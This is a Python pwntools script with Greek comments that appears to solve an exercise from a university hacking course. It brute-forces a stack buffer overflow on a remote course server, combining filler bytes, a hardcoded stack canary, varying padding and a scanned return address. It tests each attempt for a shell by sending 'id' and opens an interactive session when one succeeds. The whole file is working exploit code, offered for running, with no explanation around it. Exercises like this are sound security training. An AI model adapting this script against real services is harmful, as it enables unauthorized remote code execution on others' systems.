from pwn import *
import time

# Στοιχεία Σύνδεσης
HOST = 'shell.hackintro.di.uoa.gr'
PORT = 28285

# Σταθερά Δεδομένα
CANARY_VAL = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00" 
BASE_ADDR = 0x08049226 # Η αρχική διεύθυνση που έχεις
PREFIX_LEN = 6
LOCAL_SIZE = 128

def start_total_scan(addr_start_offset, addr_end_offset, pad_start, pad_end):
    iteration = 1
    
    # Εξωτερικό loop: Αλλαγή Διεύθυνσης (ανά 4 bytes)
    for addr_diff in range(addr_start_offset, addr_end_offset + 1, 4):
        current_addr_int = BASE_ADDR + addr_diff
        current_addr_bytes = p32(current_addr_int) # Μετατροπή σε bytes (Little Endian)
        
        # Εσωτερικό loop: Αλλαγή Padding (τα "B")
        for padding in range(pad_start, pad_end + 1, 4):
            
            # Εμφάνιση μόνο των στοιχείων που ζήτησες
            print(f"[{iteration}] Δοκιμή -> Offset: {padding} | Addr: {hex(current_addr_int)}")
            
            try:
                # Σύνδεση με απόκρυψη των info μηνυμάτων των pwntools
                r = remote(HOST, PORT, timeout=0.5, level='error')
                
                buf = b"A" * (LOCAL_SIZE - PREFIX_LEN)
                payload = buf + CANARY_VAL + (b"B" * padding) + current_addr_bytes
                
                r.send(payload)
                
                # Γρήγορη δοκιμή για shell
                r.sendline(b"id")
                time.sleep(0.4) 
                
                res = r.recvall(timeout=0.5).decode(errors='ignore')
                
                if "uid=" in res or "MAINTENANCE" in res:
                    print(f"\n[!!!] ΕΠΙΤΥΧΙΑ!")
                    print(f"Βρέθηκε στο Offset: {padding} και Διεύθυνση: {hex(current_addr_int)}")
                    r.interactive()
                    return

                r.close()
            except Exception:
                pass
            
            iteration += 1

if __name__ == "__main__":
    # ΡΥΘΜΙΣΕΙΣ ΕΥΡΟΥΣ:
    
    # 1. Για τη διεύθυνση (π.χ. από -64 bytes έως +64 bytes από την BASE_ADDR)
    addr_range_min = -64
    addr_range_max = 64
    
    # 2. Για το padding (π.χ. από 0 έως 32 bytes)
    pad_min = 0
    pad_max = 32
    
    start_total_scan(addr_range_min, addr_range_max, pad_min, pad_max)